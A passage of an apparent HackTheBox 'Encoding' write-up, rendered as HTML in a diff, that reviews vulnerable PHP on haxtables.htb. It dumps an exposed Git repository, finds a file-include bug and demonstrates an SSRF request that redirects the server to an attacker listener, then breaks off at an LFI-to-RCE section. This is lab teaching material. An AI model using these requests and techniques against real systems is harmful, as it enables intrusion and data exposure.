+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">make_api_call</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$uri_path</span><span class="p">,</span> <span class="nv">$is_file</span> <span class="o">=</span> <span class="kc">false</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$is_file</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$post</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span>
+            <span class="s1">'action'</span> <span class="o">=&gt;</span> <span class="nv">$action</span><span class="p">,</span>
+            <span class="s1">'uri_path'</span> <span class="o">=&gt;</span> <span class="nv">$uri_path</span>
+        <span class="p">];</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$post</span> <span class="o">=</span> <span class="p">[</span>
+            <span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+            <span class="s1">'action'</span> <span class="o">=&gt;</span> <span class="nv">$action</span><span class="p">,</span>
+            <span class="s1">'uri_path'</span> <span class="o">=&gt;</span> <span class="nv">$uri_path</span>
+        <span class="p">];</span>
+    <span class="p">}</span>
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://api.haxtables.htb'</span> <span class="mf">.</span> <span class="nv">$uri_path</span> <span class="mf">.</span> <span class="s1">'/index.php'</span><span class="p">;</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span><span class="no">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_PROTOCOLS</span><span class="p">,</span> <span class="no">CURLPROTO_HTTP</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span> <span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">));</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span> <span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'Content-Type:application/json'</span><span class="p">));</span>
+    <span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>So the page uses JavaScript to hit another page on the main site, and that site uses PHP to issue a request to the API. The response is passed back to the PHP page and then packaged to send to the user. This is a very odd site flow.</p>
+<p>There’s also an SSRF vulnerability in this page which I’ll show below.</p>
+<h4 id="imagehaxtableshtb">image.haxtables.htb</h4>
+<p>The <code class="language-plaintext highlighter-rouge">index.php</code> on <code class="language-plaintext highlighter-rouge">image.haxtables.htb</code> is very simple:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+
+<span class="k">include_once</span> <span class="s1">'utils.php'</span><span class="p">;</span>
+
+<span class="k">include</span> <span class="s1">'includes/coming_soon.html'</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>The HTML page is just static. <code class="language-plaintext highlighter-rouge">utils.php</code> has a bunch of functions. <code class="language-plaintext highlighter-rouge">get_url_content</code> is using <code class="language-plaintext highlighter-rouge">curl</code> to get files from a URL:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">get_url_content</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$domain</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$domain</span><span class="p">)</span> <span class="o">===</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nf">jsonify</span><span class="p">([</span><span class="s2">"message"</span> <span class="o">=&gt;</span> <span class="s2">"Unacceptable URL"</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_PROTOCOLS</span><span class="p">,</span> <span class="no">CURLPROTO_HTTP</span> <span class="o">|</span> <span class="no">CURLPROTO_HTTP</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="no">CURLOPT_REDIR_PROTOCOLS</span><span class="p">,</span> <span class="no">CURLPROTO_HTTPS</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span><span class="no">CURLOPT_CONNECTTIMEOUT</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span><span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+    <span class="nv">$url_content</span> <span class="o">=</span>  <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$url_content</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">gethostbyname</code> check is what blocks me from accessing <code class="language-plaintext highlighter-rouge">localhost</code> or <code class="language-plaintext highlighter-rouge">127.0.0.1</code> or <code class="language-plaintext highlighter-rouge">image.haxtables.htb</code> (I’ll show why this fails in <a href="#beyond-root">Beyond Root</a>).</p>
+<p>Three functions at the bottom are interacting with <code class="language-plaintext highlighter-rouge">git</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">git_status</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$status</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cd /var/www/image &amp;&amp; /usr/bin/git status'</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$status</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">git_log</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$log</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cd /var/www/image &amp;&amp; /usr/bin/git log --oneline "'</span> <span class="mf">.</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'"'</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$log</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">git_commit</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$commit</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'sudo -u svc /var/www/image/scripts/git-commit.sh'</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$commit</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The first thing to look at is the <code class="language-plaintext highlighter-rouge">shell_exec</code> calls, but it seems that no user input is used to form the commands, so there’s not command execution there. It is interesting to note for later that the user running the webserver is able to run <code class="language-plaintext highlighter-rouge">sudo</code> as svc for these commands without a password. I’ll come back to <code class="language-plaintext highlighter-rouge">git-commit.sh</code> as well.</p>
+<p>This script also suggests there is a Git repository here.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://localhost:5000/var/www/image/.git/config
+<span class="go">[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+</span></code></pre></div></div>
+<p>It’s there.</p>
+<h4 id="download-repo-manually">Download Repo Manually</h4>
+<p>The author’s intended path is to rebuild the repo manually using the file read vulnerability. <a href="https://git.seveas.net/manpages/gitrepository-layout.html">This man page</a> shows the layout of a Git repo. I’ll start in an empty directory initializing the repo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git init
+<span class="go">Initialized empty Git repository in ~/hackthebox/encoding-10.10.11.198/git-manual/.git/
+</span></code></pre></div></div>
+<p>I’ll add <code class="language-plaintext highlighter-rouge">config</code> and <code class="language-plaintext highlighter-rouge">HEAD</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost:5000/var/www/image/.git/config <span class="o">&gt;</span> .git/config
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost:5000/var/www/image/.git/HEAD | <span class="nb">tee</span> .git/HEAD
+<span class="go">ref: refs/heads/master
+</span></code></pre></div></div>
+<p>Knowing the HEAD, I’ll fetch the file in <code class="language-plaintext highlighter-rouge">refs/heads/[branch name]</code> that will give the “tip-of-the-tree” commit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mkdir</span> <span class="nt">-p</span> .git/refs/heads
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost:5000/var/www/image/.git/refs/heads/master | <span class="nb">tee</span> .git/refs/heads/master
+<span class="go">9c17e5362e5ce2f30023992daad5b74cc562750b
+</span></code></pre></div></div>
+<p>I’m using <code class="language-plaintext highlighter-rouge">tee</code> to both see the contents of the file and save the file into my repo. The commit is a SHA1 hash, and the associated objects will be in <code class="language-plaintext highlighter-rouge">.git/objects/[first two char of sha1]/[rest of sha1]</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">-s</span> http://localhost:5000/var/www/image/.git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b | <span class="nb">tee</span> .git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b
+<span class="go">xA
+0=,&amp;m           nii`ʺ,ZAPH:S(\:Q:Of*/gIHy$
+Qb_bhZi6G)?'W;'a&gt;gf
+i;/ҒE/
+</span></code></pre></div></div>
+<p>The results are not obvious. That’s because they are <a href="https://matthew-brett.github.io/curious-git/reading_git_objects.html">zlib compressed</a>. That article shows up to decompress them with Python:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.11.2 (main, Feb  8 2023, 14:49:25) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">zlib</span> 
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">.git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="gp">...</span><span class="w">     </span><span class="n">compressed_contents</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+<span class="c">... 
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">decompressed_contents</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="nf">decompress</span><span class="p">(</span><span class="n">compressed_contents</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">print</span><span class="p">(</span><span class="n">decompressed_contents</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+<span class="go">commit 219tree 30617cae3686895c80152d93a0568e3d0b6a0c49
+parent a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
+author james &lt;james@haxtables.htb&gt; 1668104210 +0000
+committer james &lt;james@haxtables.htb&gt; 1668104210 +0000
+
+Updated scripts!
+</span></code></pre></div></div>
+<p>Alternatively, there’s a <code class="language-plaintext highlighter-rouge">git</code> subcommand, <code class="language-plaintext highlighter-rouge">cat-file</code> (<a href="https://git-scm.com/docs/git-cat-file">docs</a>, that will do this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git cat-file <span class="nt">-p</span> 9c17e5362e5ce2f30023992daad5b74cc562750b
+<span class="go">tree 30617cae3686895c80152d93a0568e3d0b6a0c49
+parent a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
+author james &lt;james@haxtables.htb&gt; 1668104210 +0000
+committer james &lt;james@haxtables.htb&gt; 1668104210 +0000
+
+Updated scripts!
+</span></code></pre></div></div>
+<p>This object is built with a reference to another object, <code class="language-plaintext highlighter-rouge">30617cae3686895c80152d93a0568e3d0b6a0c49</code>. I’ll need to get that on into place using the same method:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">mkdir</span> .git/objects/30
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost:5000/var/www/image/.git/objects/30/617cae3686895c80152d93a0568e3d0b6a0c49 <span class="o">&gt;</span> .git/objects/30/617cae3686895c80152d93a0568e3d0b6a0c49
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>git cat-file <span class="nt">-p</span> 30617cae3686895c80152d93a0568e3d0b6a0c49
+<span class="go">040000 tree 26c6c873fe81c801d731e417bf5d92e5bfa317d2    actions
+040000 tree 9a515b22daea1a74bbcf5d348ad9339202a8edd6    assets
+040000 tree 2aa032b5df9bbaeedff30b6e13be938e48cae5f4    includes
+100644 blob 72f0e39a9438fc0f915f63e2f26b762eb170cf8b    index.php
+040000 tree e074c833c28d3b024eeea724cf892a440f89a5aa    scripts
+100644 blob ec9b154d84cab1888e2724c1083bf97eb57837c9    utils.php
+</span></code></pre></div></div>
+<p>This one references more trees and blobs. If I try a <code class="language-plaintext highlighter-rouge">git status</code> right now, it complains that the top tree item is missing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">fatal: unable to read tree 26c6c873fe81c801d731e417bf5d92e5bfa317d2
+</span></code></pre></div></div>
+<p>I’ll download the file as before, then run <code class="language-plaintext highlighter-rouge">git status</code> to see if anything is missing, and after a handful more, I get:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch master
+Changes to be committed:
+  (use "git restore --staged &lt;file&gt;..." to unstage)
+        deleted:    actions/action_handler.php
+        deleted:    actions/image2pdf.php
+        deleted:    assets/img/forestbridge.jpg
+        deleted:    includes/coming_soon.html
+        deleted:    index.php
+        deleted:    scripts/git-commit.sh
+        deleted:    utils.php
+</span></code></pre></div></div>
+<p>That’s saying that the repo shows those files in the last commit, but they are not on disk now, so it’s showing them as deleted.</p>
+<p>Running <code class="language-plaintext highlighter-rouge">git reset --hard</code> shows a few more missing objects:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git reset <span class="nt">--hard</span>
+<span class="go">error: unable to read sha1 file of actions/action_handler.php (2d600ee8a453abd9bd515c41c8fa786b95f96f82)
+error: unable to read sha1 file of actions/image2pdf.php (e69de29bb2d1d6434b8b29ae775ad8c2e48c5391)
+error: unable to read sha1 file of assets/img/forestbridge.jpg (62370b37f2f05b910c76c23d1d4ce9f7e3413ea6)
+error: unable to read sha1 file of includes/coming_soon.html (f9d432448807f47dfd13cb71acc3fd6890f21ee0)
+error: unable to read sha1 file of index.php (72f0e39a9438fc0f915f63e2f26b762eb170cf8b)
+error: unable to read sha1 file of scripts/git-commit.sh (c1308cdc2b0fac3eb5b1e0872cdec44941ff22f5)
+error: unable to read sha1 file of utils.php (ec9b154d84cab1888e2724c1083bf97eb57837c9)
+fatal: Could not reset index file to revision 'HEAD'.
+</span></code></pre></div></div>
+<p>Once I download those, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git reset <span class="nt">--hard</span>
+<span class="go">HEAD is now at 9c17e53 Updated scripts!
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>git status 
+<span class="go">On branch master
+nothing to commit, working tree clean
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">actions  assets  includes  index.php  scripts  utils.php
+</span></code></pre></div></div>
+<h4 id="git-dumper">git-dumper</h4>
+<p>One of the reasons I wrote the Proxy the way I did was so that I could just use a tool like <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to download the repo. It’ll make requests to <code class="language-plaintext highlighter-rouge">http://localhost:5000/var/www/image/.git/</code> and the results will be the files it needs, as if they were hosted on that host. The only trick is that <code class="language-plaintext highlighter-rouge">git-dumper</code> is a bit picky about the <code class="language-plaintext highlighter-rouge">content-type</code> response header, so I had to make sure to set that in the proxy.</p>
+<p>For some reason, I get an error having to do with downloading the all 0 object (seems like an error), and it says it’s corrupt, but it works fine for my purposes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git-dumper http://localhost:5000/var/www/image/.git git-dumper/                                          
+<span class="go">[-] Testing http://localhost:5000/var/www/image/.git/HEAD [200]
+[-] Testing http://localhost:5000/var/www/image/.git/ [200]
+[-] Fetching common files
+[-] Fetching http://localhost:5000/var/www/image/.git/description [200]
+[-] Fetching http://localhost:5000/var/www/image/.gitignore [200]
+[-] Fetching http://localhost:5000/var/www/image/.git/hooks/applypatch-msg.sample [200]                      
+[-] Fetching http://localhost:5000/var/www/image/.git/hooks/commit-msg.sample [200]
+...[snip]...
+[-] Fetching http://localhost:5000/var/www/image/.git/objects/00/00000000000000000000000000000000000000 [200]
+Task 0000000000000000000000000000000000000000 raised exception:
+Traceback (most recent call last):
+...[snip]...
+dulwich.objects.EmptyFileException: Corrupted empty file detected
+[-] Running git checkout .
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">actions  assets  includes  index.php  scripts  utils.php
+</span></code></pre></div></div>
+<h3 id="image-source-analysis">image Source Analysis</h3>
+<h4 id="overview">Overview</h4>
+<p>After filtering out the files in <code class="language-plaintext highlighter-rouge">.git</code>, only a handful remain:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-path</span> ./.git <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> f <span class="nt">-print</span>
+<span class="go">./includes/coming_soon.html
+./utils.php
+./index.php
+./actions/action_handler.php
+./actions/image2pdf.php
+./assets/img/forestbridge.jpg
+./.gitignore
+./scripts/git-commit.sh
+</span></code></pre></div></div>
+<p>I’ve already looked at <code class="language-plaintext highlighter-rouge">index.php</code> and <code class="language-plaintext highlighter-rouge">utils.php</code>. <code class="language-plaintext highlighter-rouge">git-commit.sh</code> involves committing to the local Git repo and is invoked via the API. I’ll come back to this script later, but for now, I’ll just say that I cannot conceive of a reason why someone would want this functionality in an API.</p>
+<h4 id="actions">actions</h4>
+<p>The <code class="language-plaintext highlighter-rouge">actions</code> directory has two files in it. <code class="language-plaintext highlighter-rouge">image2pdf.php</code> is empty. It’s not clear at this time if that’s an issue with how the repo was reconstructed or if it’s truly empty, but it is empty in both the <code class="language-plaintext highlighter-rouge">git-dumper</code> and manually reconstructed repo (once I get a shell I can confirm it’s empty on Encoding as well).</p>
+<p><code class="language-plaintext highlighter-rouge">action_handler.php</code> seems like it’s the start of a new main page:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">include_once</span> <span class="s1">'utils.php'</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nf">jsonify</span><span class="p">([</span><span class="s1">'message'</span> <span class="o">=&gt;</span> <span class="s1">'No page specified!'</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>It doesn’t really do much yet, but it has an obvious file include vulnerability, as the user controls the <code class="language-plaintext highlighter-rouge">page</code> parameter.</p>
+<h3 id="ssrf-in-haxtableshtb">SSRF in haxtables.htb</h3>
+<p>The intended way to exploit this box was through an SSRF in <code class="language-plaintext highlighter-rouge">haxtables.htb</code>. There’s a shortcut I’ll show in <a href="#beyond-root">Beyond Root</a>.</p>
+<h4 id="uri-structure">URI Structure</h4>
+<p><a href="https://www.rfc-editor.org/rfc/rfc3986#appendix-A">RFC 3986 Appendix-A</a> shows the format of a URI. Pulling out the parts that matter here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   URI           = scheme ":" hier-part [ "?" query ] [ "#" fragment ]
+
+   hier-part     = "//" authority path-abempty
+                 / path-absolute
+                 / path-rootless
+                 / path-empty
+...[snip]...
+   scheme        = ALPHA *( ALPHA / DIGIT / "+" / "-" / "." )
+
+   authority     = [ userinfo "@" ] host [ ":" port ]
+   userinfo      = *( unreserved / pct-encoded / sub-delims / ":" )
+   host          = IP-literal / IPv4address / reg-name
+   port          = *DIGIT
+...[snip]...
+</code></pre></div></div>
+<p>So a URL can look like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[scheme]://[authority][path-abempty]
+</code></pre></div></div>
+<p>For this case, <code class="language-plaintext highlighter-rouge">scheme</code> is <code class="language-plaintext highlighter-rouge">http</code>. <code class="language-plaintext highlighter-rouge">authority</code> is the <code class="language-plaintext highlighter-rouge">host</code>, but it can have an optional <code class="language-plaintext highlighter-rouge">:[port]</code> after it, and an optional <code class="language-plaintext highlighter-rouge">[userinfo]@</code> before it. <code class="language-plaintext highlighter-rouge">path-abempty</code> is either empty or starts with <code class="language-plaintext highlighter-rouge">/</code>.</p>
+<h4 id="ssrf">SSRF</h4>
+<p>In the <code class="language-plaintext highlighter-rouge">make_api_call</code> function, it takes user input to build a URL that is passed to <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://api.haxtables.htb'</span> <span class="mf">.</span> <span class="nv">$uri_path</span> <span class="mf">.</span> <span class="s1">'/index.php'</span><span class="p">;</span>
+</code></pre></div></div>
+<p>It’s clear that this can be any path on <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code> that ends with <code class="language-plaintext highlighter-rouge">/index.php</code>. But because there’s no <code class="language-plaintext highlighter-rouge">/</code> between <code class="language-plaintext highlighter-rouge">.htb</code> and the user input, I can actually use this to reach other servers as well by adding an <code class="language-plaintext highlighter-rouge">@</code> symbol.</p>
+<p>If I send <code class="language-plaintext highlighter-rouge">@10.10.14.6</code> as the <code class="language-plaintext highlighter-rouge">$uri_path</code>, then <code class="language-plaintext highlighter-rouge">$url</code> will be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://api.hacktables.htb@10.10.14.6/index.php
+</code></pre></div></div>
+<p>I’ll send the POST request to <code class="language-plaintext highlighter-rouge">haxtables.htb/handler.php</code> into Burp Repeater and update the <code class="language-plaintext highlighter-rouge">uri_path</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/handler.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">haxtables.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json;charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">69</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.198</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.198/index.php?page=string</span>
+
+<span class="p">{</span><span class="nl">"action"</span><span class="p">:</span><span class="s2">"md5"</span><span class="p">,</span><span class="nl">"data"</span><span class="p">:</span><span class="s2">"0xdf was here"</span><span class="p">,</span><span class="nl">"uri_path"</span><span class="p">:</span><span class="s2">"@10.10.14.6"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">nc</code> listening on 80 and on sending the above request, there’s a request at <code class="language-plaintext highlighter-rouge">nc</code> from Encoding:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.6</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic YXBpLmhheHRhYmxlcy5odGI6</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Content-Type</span><span class="p">:</span><span class="s">application/json</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">64</span>
+
+<span class="p">{</span><span class="nl">"data"</span><span class="p">:</span><span class="s2">"0xdf was here"</span><span class="p">,</span><span class="nl">"action"</span><span class="p">:</span><span class="s2">"md5"</span><span class="p">,</span><span class="nl">"uri_path"</span><span class="p">:</span><span class="s2">"@10.10.14.6"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Rather than sending to <code class="language-plaintext highlighter-rouge">api.haxtables.htb</code>, it’s hit my server. The <code class="language-plaintext highlighter-rouge">Authorization</code> header has base64 data that decodes to that <code class="language-plaintext highlighter-rouge">userinfo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"YXBpLmhheHRhYmxlcy5odGI6"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">api.haxtables.htb:
+</span></code></pre></div></div>
+<h3 id="lfi---rce">LFI -&gt; RCE</h3>
+<h4 id="background">Background</h4>
+<p>It used to be that to take an local file include (LFI) to remote code execution (RCE), you needed to get malicious PHP code into a file on the server somewhere, by abusing an unsafe file upload or something like log poisoning.</p>
